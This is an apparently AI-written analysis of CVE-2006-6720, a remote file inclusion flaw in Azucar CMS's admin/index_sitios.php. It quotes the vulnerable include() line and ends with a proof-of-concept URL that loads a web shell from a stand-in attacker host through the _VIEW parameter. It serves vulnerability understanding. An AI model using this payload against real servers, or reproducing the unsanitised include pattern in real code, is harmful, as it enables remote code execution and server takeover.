Based on the provided content, here's a breakdown of the vulnerability described in CVE-2006-6720:

**Root Cause of Vulnerability:**

*   The vulnerability lies in the insecure use of the `include()` function in the `admin/index_sitios.php` file of Azucar CMS.
*   The script directly includes the file path specified through the `_VIEW` parameter in the HTTP GET request.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary weakness is the ability to include and execute a remote file from an attacker-controlled URL. This allows for arbitrary code execution on the server.
*   **Lack of Input Sanitization/Validation:** The script does not validate or sanitize the input provided through the `_VIEW` parameter, making it vulnerable to RFI.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file, an attacker can execute arbitrary code on the web server. This could lead to:
    *   Complete compromise of the web server.
    *   Data theft or manipulation.
    *   Installation of backdoors.
    *   Denial of Service.
    *   Other malicious activities.

**Attack Vectors:**

*   **HTTP GET Request:** The attack is launched by crafting a malicious HTTP GET request to the vulnerable `admin/index_sitios.php` file.
*   **_VIEW Parameter:** The vulnerable parameter is `_VIEW`, which is used in the `include()` function without any prior sanitization or validation.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable web server.
*   **Knowledge of Vulnerable Parameter:** The attacker must know that the `_VIEW` parameter in the mentioned script is vulnerable.
*   **Ability to Host a Malicious File:** The attacker needs to host a malicious PHP file (e.g., a web shell) on a server they control.

**Technical Details:**

The vulnerable code in `admin/index_sitios.php`, lines 14-15:

```php
if (isset($_GET[_VIEW])) include($_GET[_VIEW]);
```

**Proof of Concept (PoC):**

```
http://[target]/[path]/admin/index_sitios.php?_VIEW=http://evilsite.com/shell.php
```

In this PoC:

*   `[target]` is the IP address or hostname of the vulnerable server.
*   `[path]` is the directory path where Azucar CMS is installed.
*   `http://evilsite.com/shell.php` is the URL of the malicious PHP shell hosted by the attacker.
